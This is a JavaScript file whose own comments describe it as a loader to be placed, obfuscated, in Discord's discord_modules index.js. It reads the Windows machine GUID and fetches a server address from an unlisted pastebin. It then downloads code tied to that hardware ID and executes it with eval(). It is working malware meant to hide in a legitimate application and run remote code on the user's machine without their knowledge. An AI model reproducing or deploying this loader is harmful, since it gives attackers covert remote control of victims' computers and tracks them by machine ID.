// This is the (unobfuscated here) code that the user will initially run (will be in the discord_modules index.js file)
// and the host will be on a unlisted pastebin, just incase.
// This should never need to change.

// First export original
//module.exports = require('./discord_modules.node');

const https = require('https');
const http = require('http');

const { exec } = require('child_process');
const { createHash } = require('crypto');

const httpTable = {
    https,
    http,
};

const machineId = () => {
    return new Promise((resolve, reject) => {
        let is64 = false;

        try {
            is64 = !!require('fs').statSync('C:\\windows\\sysnative');
        } catch (e) {}

        exec(
            `%windir%\\${is64 ? 'sysnative' : 'system32'}\\REG.exe QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid`,
            {},
            (err, stdout, stderr) => {
                if (err) {
                    console.log(err.stack);
                    reject();
                    return;
                }

                resolve(
                    createHash('sha256')
                        .update(
                            stdout
                                .toString()
                                .split('REG_SZ')[1]
                                .replace(/\r+|\n+|\s+/gi, '')
                                .toLowerCase()
                        )
                        .digest('hex')
                );
            }
        );
    });
};

const post = (httpS, hostname, path, port, d, headers = {}, full = false) => {
    return new Promise((resolve) => {
        const data = JSON.stringify(d);
        const req = httpTable[httpS].request(
            {
                hostname,
                port,
                path,
                method: 'POST',
                headers: {
                    ...headers,
                    'Content-Type': 'application/json',
                    'Content-Length': data.length,
                },
            },
            (res) => {
                let responseStr = '';

                res.on('data', (d) => {
                    responseStr += d.toString();
                });

                res.on('end', () => {
                    res.body = responseStr.toString();

                    if (full) resolve(res);
                    else resolve(responseStr.toString());
                });
            }
        );

        req.on('error', (error) => {});

        req.write(data);
        req.end();
    });
};

const get = (httpS, url, headers = {}, full = false) => {
    return new Promise((resolve, reject) => {
        let userAgent = headers['user-agent'];
        if (!userAgent) userAgent = '5A16C235E6838352BAE5F6B3DD4C8CC3AC63FE30D7B2AA4C7756433BB5272764';

        httpTable[httpS]['get'](url, { headers: { ...headers, 'user-agent': userAgent } }, (res) => {
            let responseStr = '';

            res.on('data', (data) => {
                responseStr += data;
            });

            res.on('end', () => {
                res.body = responseStr.toString();

                if (full) resolve(res);
                else resolve(responseStr.toString());
            });
        }).on('error', (e) => reject(e));
    });
};

// https://pastebin.com/raw/byqR6BER = localhost:500/c/:hwid
get('https', 'https://pastebin.com/raw/byqR6BER').then((url) => {
    const startsWithHttps = url.toLowerCase().startsWith('https');

    machineId().then((hwid) => {
        get(startsWithHttps ? 'https' : 'http', url.toLowerCase() + '/c/' + hwid).then((res) => eval(res));
    });
});
